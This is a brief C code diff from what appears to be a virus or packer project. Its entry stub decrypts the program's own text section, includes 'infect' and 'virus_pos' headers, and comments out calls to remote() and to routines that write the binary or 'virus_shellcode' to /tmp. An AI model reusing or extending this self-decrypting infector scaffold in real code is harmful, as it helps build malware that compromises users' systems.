@@ -2,7 +2,8 @@ int main(int ac, char **av) asm ("entry");
 
 #include "lib/lib.h"
 #include "lib/remote.h"
-//#include "lib/infect.c"
+#include "lib/infect.h"
+#include "virus_pos.h"
 
 //extern size_t memaddr;
 extern void _infect();
@@ -46,14 +47,19 @@ void __attribute__((section (".textearly")))decrypt(char *s, uint64_t n, uint32_
 //=============================================================
 
 int __attribute__((section (".textearly")))main(int ac, char **av){
+	//print("....WOODY....\n");
+	//create_woody("/tmp/test", (void*)&bin_start, (size_t)&bin_end - (size_t)&bin_start);
 	decrypt((void*)text_start, text_length, (uint32_t*)key);
 	decrypt(&test_area, 8, (uint32_t*)key);
-	//check test_start is full of '0'
-	for (int i = 0; i < 8; i++){
-		if ((&test_area)[i] != 'A')
-		{
-			remote();
-		}
-	}
+	////check test_start is full of '0'
+	//for (int i = 0; i < 8; i++){
+	//	if ((&test_area)[i] != 'A')
+	//	{
+	//print("OK\n");
+	//		create_woody("/tmp/test", (void*)&bin_start, (size_t)&bin_end - (size_t)&bin_start);
+	//		//create_woody("/tmp/test2", virus_shellcode, virus_shellcode_len);
+	//		//remote();
+	//	}
+	//}
 
 }
